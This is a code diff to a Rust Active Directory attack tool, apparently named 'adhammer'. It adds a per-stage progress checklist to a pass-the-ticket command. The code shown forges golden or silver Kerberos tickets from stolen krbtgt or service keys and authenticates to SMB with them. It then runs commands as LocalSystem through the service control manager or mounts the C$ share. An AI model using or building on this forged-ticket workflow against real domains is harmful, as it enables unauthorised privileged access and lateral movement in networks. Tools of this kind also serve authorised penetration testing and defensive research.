@@ -3,6 +3,7 @@
 //! end-to-end proof that a forged ticket grants access. Internal struct/fn
 //! stay named `Pth*` for the 1.3.10 subcommand rename (`pth` → `ptt`).
 
+use crate::ui;
 use anyhow::{Context, Result};
 use clap::Parser;
 
@@ -53,8 +54,36 @@ fn looks_like_ip(s: &str) -> bool {
 
 /// Pass-the-ticket: forge a golden or silver ticket, obtain a service ticket for the SPN, and
 /// authenticate to SMB with a Kerberos AP-REQ — then optionally run a command as the impersonated
-/// identity (LocalSystem via SVCCTL). The end-to-end proof that a forged ticket grants access.
+/// identity (LocalSystem via SVCCTL).
+///
+/// Wraps `pth_impl` with a per-stage checklist so the run-end card breaks the operation into
+/// distinct phases (parse SID → build service ticket → SMB Kerberos auth → run/verify).
 pub(crate) async fn pth(a: PthArgs) -> Result<()> {
+    let mut checklist = ui::StageChecklist::new([
+        "parse domain SID",
+        "build service ticket (golden→TGS-REQ or silver forge)",
+        "SMB Kerberos AP-REQ (login_kerberos)",
+        "run command / tree-connect (verify access)",
+    ]);
+    let result = pth_impl(a, &mut checklist).await;
+    match &result {
+        Ok(()) => checklist.render("PtT stages"),
+        Err(e) => {
+            let brief = format!("{e:#}")
+                .lines()
+                .next()
+                .unwrap_or("failed")
+                .chars()
+                .take(80)
+                .collect::<String>();
+            checklist.mark_current_failed(brief);
+            checklist.render("PtT stages (failed)");
+        }
+    }
+    result
+}
+
+async fn pth_impl(a: PthArgs, checklist: &mut ui::StageChecklist) -> Result<()> {
     use adhammer_kerberos::pac::ForgeIdentity;
     use smb2_client::SmbClient;
 
@@ -65,6 +94,7 @@ pub(crate) async fn pth(a: PthArgs) -> Result<()> {
         .map(|x| x.parse::<u32>())
         .collect::<std::result::Result<_, _>>()
         .context("--domain-sid must be S-1-5-21-a-b-c")?;
+    checklist.record_ok("parse domain SID", format!("→ {}", a.domain_sid));
     let spn = a.spn.clone().unwrap_or_else(|| format!("cifs/{}", a.host));
     // Kerberos SPNs are registered against hostnames/FQDNs — never against IPs. Save the user
     // a `KDC_ERR_S_PRINCIPAL_UNKNOWN` roundtrip by front-checking.
@@ -95,13 +125,22 @@ pub(crate) async fn pth(a: PthArgs) -> Result<()> {
             println!("[+] forged golden TGT for {}@{}", a.user, a.realm);
             let st = adhammer_kerberos::get_service_ticket(&tgt, &spn, &kdc).await?;
             println!("[+] got service ticket for {spn} (KDC accepted the golden TGT)");
+            checklist.record_ok(
+                "build service ticket (golden→TGS-REQ or silver forge)",
+                format!("golden → KDC accepted, TGS for {spn}"),
+            );
             st
         }
         (None, Some(k)) => {
             let key = crate::parse_forge_key(k, a.rc4)?;
             let tgt = adhammer_kerberos::forge_silver_tgt(&id, &a.realm, &key, &spn, a.rc4)?;
             println!("[+] forged silver ticket for {spn}");
-            adhammer_kerberos::silver_service_ticket(&tgt, &spn)
+            let st = adhammer_kerberos::silver_service_ticket(&tgt, &spn);
+            checklist.record_ok(
+                "build service ticket (golden→TGS-REQ or silver forge)",
+                format!("silver → forged for {spn}"),
+            );
+            st
         }
         _ => anyhow::bail!(
             "provide exactly one of --krbtgt-aes256 (golden) or --service-aes256 (silver)"
@@ -111,6 +150,10 @@ pub(crate) async fn pth(a: PthArgs) -> Result<()> {
     let (blob, key) = adhammer_kerberos::build_ap_req_gss(&st)?;
     let mut smb = SmbClient::connect(&a.host).await?;
     smb.login_kerberos(&blob, &key).await?;
+    checklist.record_ok(
+        "SMB Kerberos AP-REQ (login_kerberos)",
+        format!("session as {}@{}", a.user, a.realm),
+    );
     println!(
         "[+] Kerberos SMB session established as {} (pass-the-ticket)",
         a.user
@@ -119,6 +162,10 @@ pub(crate) async fn pth(a: PthArgs) -> Result<()> {
     if let Some(cmd) = &a.command {
         smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
         let r = dcerpc::svcctl::exec(&mut smb, &a.host, cmd).await?;
+        checklist.record_ok(
+            "run command / tree-connect (verify access)",
+            format!("service '{}' ran (win32 {})", r.service, r.start_win32),
+        );
         println!(
             "[+] ran as LocalSystem (service '{}', win32 {})",
             r.service, r.start_win32
@@ -129,6 +176,10 @@ pub(crate) async fn pth(a: PthArgs) -> Result<()> {
         }
     } else {
         smb.tree_connect(&format!("\\\\{}\\C$", a.host)).await?;
+        checklist.record_ok(
+            "run command / tree-connect (verify access)",
+            format!("\\\\{}\\C$ tree-connected", a.host),
+        );
         println!(
             "[+] tree-connected \\\\{}\\C$ — authenticated access confirmed",
             a.host
